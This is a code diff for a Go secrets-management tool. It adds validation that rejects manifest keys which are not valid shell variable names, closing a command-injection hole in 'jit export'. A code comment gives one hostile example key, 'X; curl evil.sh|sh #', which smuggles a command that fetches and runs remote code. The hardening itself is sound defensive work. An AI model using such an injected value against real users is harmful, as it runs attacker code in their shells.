@@ -28,6 +28,25 @@ const ProfilesDir = ".jit/profiles"
 // second) applies here too.
 var namePattern = regexp.MustCompile(`^[A-Za-z0-9_.\-]+$`)
 
+// varNamePattern is what a manifest's KEYS must look like: the POSIX shell
+// name rule, and the same shape internal/migrate's own envLinePattern already
+// enforces on every name it writes.
+//
+// This is a security boundary, not tidiness. `jit export` renders each entry
+// as `export <name>=<quoted value>` for the user to `eval`, and while the
+// VALUE side is single-quote escaped for arbitrary bytes, the name is
+// interpolated verbatim — so a key like `X; curl evil.sh|sh #` becomes a
+// command in a line the user is about to run in their own shell. Manifests are
+// designed to be committed and shared (see ProfilesDir), which makes a hostile
+// one an ordinary pull-request-shaped delivery of exactly the
+// malicious-repo-content attack RFC §1 names as jit's reason to exist.
+//
+// Rejected, never sanitized: a mangled name would silently fill the wrong
+// variable, and there is no legitimate reading of a key the shell cannot
+// export anyway. It also settles a second bug for free — a name containing
+// `=` made inject.MergeEnv emit `FOO=BAR=<secret>`, quietly shadowing FOO.
+var varNamePattern = regexp.MustCompile(`^[A-Za-z_][A-Za-z0-9_]*$`)
+
 // Profile maps an environment variable name to the vault secret path that
 // should fill it (RFC.md Pillar IV) — a named *view* over the vault tree,
 // not a copy of it.
@@ -148,6 +167,13 @@ func LoadFileOrdered(path string) (Profile, []string, error) {
 	for varName, secretPath := range p {
 		if strings.TrimSpace(varName) == "" {
 			return nil, nil, fmt.Errorf("profile %s: has an entry with an empty variable name", path)
+		}
+		if !varNamePattern.MatchString(varName) {
+			// %q, so a name carrying control characters or an embedded newline
+			// can't dress the error up as extra output of its own.
+			return nil, nil, fmt.Errorf("profile %s: %q is not a usable environment variable name "+
+				"(letters, digits and underscore, not starting with a digit). jit export renders each entry "+
+				"into shell for you to eval, so a name outside that set is refused rather than passed through", path, varName)
 		}
 		if strings.TrimSpace(secretPath) == "" {
 			return nil, nil, fmt.Errorf("profile %s: %s has no secret path", path, varName)
